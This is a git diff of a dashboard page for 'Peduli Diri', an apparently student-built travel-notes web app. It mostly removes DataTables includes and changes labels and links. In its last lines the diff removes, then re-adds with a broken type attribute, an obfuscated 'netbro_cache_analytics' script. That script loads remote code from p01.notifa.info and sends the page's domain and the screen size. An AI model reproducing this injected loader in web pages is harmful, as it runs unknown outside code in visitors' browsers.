@@ -37,12 +37,6 @@ window.location.assign('../index.php');
   <!-- Custom Style-->
   <link href="../assets/css/app-style.css" rel="stylesheet"/>
   
-
-  <!--Data Tables -->
-  <link href="../assets/plugins/bootstrap-datatable/css/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css">
-  <link href="../assets/plugins/bootstrap-datatable/css/buttons.bootstrap4.min.css" rel="stylesheet" type="text/css">
-
-  
   
 </head>
 
@@ -54,7 +48,7 @@ window.location.assign('../index.php');
   <!--Start sidebar-wrapper-->
    <div id="sidebar-wrapper" data-simplebar="" data-simplebar-auto-hide="true">
      <div class="brand-logo">
-      <a href="">
+      <a href="index.html">
        <img src="../assets/images/logo-icon.png" class="logo-icon" alt="logo icon">
        <h5 class="logo-text">Peduli Diri</h5>
      </a>
@@ -76,7 +70,7 @@ window.location.assign('../index.php');
       <li>
       <li>
         <a href="?url=tulis_catatan" class="waves-effect">
-          <i class="icon-note"></i> <span>Isi Data </span>
+          <i class="icon-note"></i> <span>Isi Data</span>
           
         </a>
   
@@ -99,7 +93,7 @@ window.location.assign('../index.php');
     
 
       <li>
-        <a href="../modul/logout.php" class="waves-effect">
+        <a href="logout.php" class="waves-effect">
         <i class="fa fa-power-off"></i>
           <span>Logout</span> 
         </a>
@@ -119,10 +113,9 @@ window.location.assign('../index.php');
        <i class="icon-menu menu-icon"></i>
      </a>
     </li>
-    <p> <h4> PEDULI DIRI - Aplikasi Catatan Perjalanan </h4></p>
+ 
   </ul>
      
-
 
 </nav>
 </header>
@@ -155,11 +148,7 @@ window.location.assign('../index.php');
             }
 
           }else{
-            echo "<br> <br>";
-            echo "<center><h3>Selamat Datang Di Aplikasi Peduli Diri</h3></center>";
-            echo "<br><br> Anda Login Sebagai :<br>";
-            echo "<h4>".$_SESSION['npm']. "</h4>";
-
+            echo "Selamat datang di aplikasi peduli diri";
           }
 
     ?>
@@ -212,39 +201,8 @@ window.location.assign('../index.php');
   <script src="../assets/js/sidebar-menu.js"></script>
   <!-- Custom scripts -->
   <script src="../assets/js/app-script.js"></script>
-
-
-  <script src="../assets/plugins/bootstrap-datatable/js/jquery.dataTables.min.js"></script>
-  <script src="../assets/plugins/bootstrap-datatable/js/dataTables.bootstrap4.min.js"></script>
-  <script src="../assets/plugins/bootstrap-datatable/js/dataTables.buttons.min.js"></script>
-  <script src="../assets/plugins/bootstrap-datatable/js/buttons.bootstrap4.min.js"></script>
-  <script src="../assets/plugins/bootstrap-datatable/js/jszip.min.js"></script>
-  <script src="../assets/plugins/bootstrap-datatable/js/pdfmake.min.js"></script>
-  <script src="../assets/plugins/bootstrap-datatable/js/vfs_fonts.js"></script>
-  <script src="../assets/plugins/bootstrap-datatable/js/buttons.html5.min.js"></script>
-  <script src="../assets/plugins/bootstrap-datatable/js/buttons.print.min.js"></script>
-  <script src="../assets/plugins/bootstrap-datatable/js/buttons.colVis.min.js"></script>
-
-    <script>
-     $(document).ready(function() {
-      //Default data table
-       $('#default-datatable').DataTable();
-
-
-       var table = $('#example').DataTable( {
-        lengthChange: false,
-        buttons: [ 'copy', 'excel', 'pdf', 'print', 'colvis' ]
-      } );
- 
-     table.buttons().container()
-        .appendTo( '#example_wrapper .col-md-6:eq(0)' );
-      
-      } );
-
-    </script>
-  
-
-  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuih2FzmamiVXBdP7rQdzhTxfpkFFtvOnyejVCSSPK6u9WcsNj8GrchwkcC0cuuN23MjWecopK9D18LKoyDfbiXPfrndpWGpPOH2fLRyh5tK5%2f2c9K0us8J%2bjf3vFsn4%2fTXFgzL766s1rvusNt%2f2awK9lOy4Vktosm3AYYGGLl5M3uaPFy1scuCQj%2f0TtP9KTGu%2baG8AY8xIwvJwZqBstW8mLUHXgBTl%2fCiejm4tW3R%2b8lXa%2bjlGl2mi3qy6h0ZR8W72goA0fM%2fheFCPwMRwWv3%2fgBJNpUwJ%2bH2t1mVHjs4ZpZ7goJxWRAK4PpOPCLgzKtOnJI%2fZInHhRwD94P7HZXLqHaKn2Dp3%2fdEJHkeaL4yuoeuu063ZBMPA0nAsB4sgvkCfWzi2EjFHA1gg77pOXVlnhhOP8kHZYxMQ4QoZOkHsqic6nVTUksRjQ3Mma4U0zDcidDMWZgPrAvo08lzOZJkkwlaTsMfMhGiEbCHIzyrFruRxowfltKRNMntpE19Ejg4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+	
+<script type="../assets/text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKujWFAQR51fO%2bPm6qO5rwZXo5YjPH6qDtaGM5W6zt0wQjFcbCxKMWzWePB%2f%2fmL05ZfCIzSuNT8TjNA0RvFHxjvpQyDy%2b0nwjEYjkMqXyJnKEcCkYiY0wTpoVkPxy63FCOh7EIAC02C3AAfGuDbybG4jKM8yv7OMn83eoyJZKtSx%2fKBLmcnolqCIokeH90TBi7jNSeVc6FiEq%2bAedoFyijdCS7OPABofv2vd3QlcJ7A6ptffzdgA8s4QS%2fhBtVfNgbibWCqktX7PvSTzMPMy9IMDM4UKk9UgiG%2fwpbKmJ0gsZdUC0BZdjam%2bCKy%2fs29mUdwqXSFdSoB8bm9vzwB9aqXHXw4oGWi4Ubi1yc1R%2bd%2fU6XwWizqXDjRFQV80f4d1nHytNTun4vFBoYTQq7oQBg2NLTiyugl1cBEfGFoWYu6OtemDlfnHIl4HCoQle82LjnsKEjsHK6YS1%2bNa%2fNHfs9XoEz5DwV7YgBL237jtvcrESrwQEXmnXr1Mk" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
 <!-- Mirrored from codervent.com/rocker/color-version/pages-blank-page.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:59 GMT -->
 </html>
